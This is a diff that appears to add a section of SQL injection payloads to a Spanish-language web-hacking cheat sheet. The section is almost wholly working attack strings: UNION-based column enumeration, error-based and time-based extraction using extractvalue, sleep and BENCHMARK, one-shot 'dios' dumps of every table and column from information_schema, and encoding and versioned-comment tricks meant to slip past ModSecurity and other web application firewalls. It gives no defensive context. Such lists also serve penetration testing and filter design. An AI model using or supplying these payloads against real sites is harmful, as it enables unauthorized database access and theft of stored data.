@@ -509,3 +509,84 @@ c	= %63
 t	= %74
 
 ```
+### Sql payloads 
+
+```
+/**8**/and/**8**/0/**8**//*!50000union*//**8**//*!50000select*//**8**/+ numero de columnas +--+
+
++/*!50000%55nIoN*/+/*!50000%53eLeCt*/+
+
+SELECT * FROM (SELECT count(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y --
+
++uNiOn+(/*!/**/SeleCT*/+1,22,333...)+--+
+
+%55%6e%49%6f%4e(/*!/**/%20SeleCT%20*/%2011,22,33,44,55,66,77,88,90,1010,1111,1212,1313,1414,1515,1616,1717,1818,1919....)
+
++/*✓*/UnIoN/*✓*/+/*✓*/AlL/*✓*/+(SeLeCt+1,2,3,%27soy%20vulnerable%27,5,6.....)+--+
+
++div+@a:=(current_user/**_**/())+UNION/**/DISTINCTROW+SELECT+1,2,@a,4+--+
+
+%75nion/**)!*/sele%63%74/**)!*/+1,2,3....
+
+/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4,5--
+
++union(select+1,2,3,4,concat(column_name),6,...+from+information_schema.columns+where+table_name=%22columna%22+limit+1,1)+--+
+
++union(select+1,2,3,database(),concat(hash,0x3a,hash),6..+from(columna))+--+
+
+
+
+```
+
+### Inyección sql tipo error based usando Extractvalue
+
+`1%20and+extractvalue(rand(),concat(0x7e,version(),0x7e,user()))--`
+
+### Sql inyection payload usando reverse
+
+`reverse(right(reverse(data),1))`
+
+### Sql inyection payload usando extractvalue:
+
+`extractvalue(rand(),concat(CHAR(126),database(),CHAR(126)))`
+
+### Sql inyection payload + url encode + timing  
+
+`-7 %23%0AAND 0--%0A /*!12345UNION*/ /*!12345ALL*/ (/*!12345SELECT*/ 1,sleep(5),'soy vulnerable',BENCHMARK(1000000,MD5('true')),5,6,7,8,9,10,11,12,13)`
+
+### Sql inyection + dios sql
+
+```
+/*!u%6eion*/ /*!se%6cect*/+1,concat(@:=0,(select count(*)from information_schema.columns where@:=concat(@,'<br>',table_name,'::',column_name)),@),3..
+
+(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)
+
+CONCAT(Tablas <br>,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=information_schema)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,table_name,0x3c62723e))))x))
+```
+
+### Sql inyection Buffer Overflow / Firewall Crash bypass + xss inyection
+
+`+and+(select%201)=(Select%200xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa....)+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4,....+--+`
+
+### sql inyection payload+ bypass Mod_Security 
+
+```
++/*!50000un0x696fn*/+/*!12345AlL*/(/*!50000se0x6c65ct*/+1)+--+
+
+/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4...
+
+-1+/*!12345UnioN*//**/(/*!12345seLECT*//**/1)+--
+
+```
+
+### Sql inyection payload + comment + hex/unhex
+
+`/*!50000select*/unhex(hex(/*!12345concat*/(0x223e,version(),0x223e,database())))`
+
+### Sql inyection payload + url encode 
+
+`+/*!12120%55%6e%49%6f%4e*/+(%53%65%4c%65%43%74+111,222,333,database(),555,...)+--+`
+
+
+
+
